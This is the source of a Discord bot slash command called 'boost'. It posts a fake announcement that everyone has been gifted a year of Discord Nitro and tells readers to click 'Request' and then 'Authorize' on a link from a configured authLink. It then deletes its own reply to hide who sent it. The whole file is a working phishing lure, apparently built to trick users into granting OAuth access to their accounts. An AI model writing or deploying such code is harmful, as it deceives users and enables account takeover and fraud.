const discord = require('discord.js');
const epic = require("../../epic");

module.exports = {
  name: "boost",
  description: "📨 Sends a Nitro Message",
  default_permission: true,
  timeout: 3000,
  category: "util",
  userPerms: ["SEND_MESSAGES"],
  ownerOnly: false,

  run: async (client, interaction, args) => {
    const row = new discord.MessageActionRow().addComponents(
      new discord.MessageButton()
        .setStyle('LINK')
        .setURL(`${epic.authLink}`)
        .setLabel("🎁 Request")
    );

    interaction.channel.send({
      embeds: [{
        title: "Hello everyone, you've all been gifted a year of Nitro Discord!",
        description: `To claim your Nitro Boost, follow these steps:
   \n1️⃣ Click the [Request](${epic.authLink}) button.
   \n2️⃣ Click the [Authorize](${epic.authLink}) button.\n\nAfter approval, you'll need to wait for 24-48 hours for the Nitro Boost to be added to your account.`,
        color: 7540649,
        image: {
          url: "https://i.ibb.co/54xmJfm/Capture-decran-le-2022-12-30-a-15-58-02.png"
        },
      }],
      components: [
        {
          type: 1,
          components: [
            {
              type: 2,
              style: 5,
              label: "🎁 Request",
              url: `${epic.authLink}`
            }
          ]
        }
      ]
    });

    interaction.deferReply();
    interaction.deleteReply();
  }
};
